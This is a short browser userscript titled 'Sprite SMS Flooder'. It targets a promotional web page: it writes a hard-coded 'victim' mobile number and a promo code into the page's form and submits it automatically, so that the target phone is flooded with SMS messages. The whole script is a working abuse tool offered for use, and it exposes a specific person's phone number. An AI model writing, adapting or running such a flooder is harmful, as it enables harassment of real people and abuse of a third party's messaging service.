// ==UserScript==
// @name           Sprite SMS Flooder
// @namespace      Manoj Biswas
// @description    SMS Flooder
// @include        https://oxicash.in/Promo/Sprite/default.aspx
// ==/UserScript==

var victim="919404786985"; // Country Code(91) + 10 digit mobile number that you want to flood :P
var code="A12411261"  ; // Leave it as it is or enter a new code :| its upto you :|

if(document.location=="https://oxicash.in/Promo/Sprite/default.aspx")
{
	document.getElementById('TB_mobno').value=victim;
	document.getElementById('TB_UCN').value=code;
	document.getElementById('BTN_submit').click();
}